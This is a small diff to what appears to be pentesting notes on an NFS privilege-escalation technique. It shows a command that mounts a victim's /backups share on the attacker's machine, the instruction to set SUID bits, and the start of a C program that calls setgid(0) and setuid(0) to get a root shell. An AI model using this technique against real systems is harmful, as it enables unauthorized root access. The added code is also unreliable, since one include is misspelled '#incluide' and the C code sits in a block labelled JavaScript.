@@ -262,6 +262,10 @@ mount -o rw <VictimIP>:/backups /tmp/backupsonattackermachine
 
 Then set the SUID bits
 ```JavaScript
+#incluide <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
 int main()
 { setgid(0);
   setuid(0);
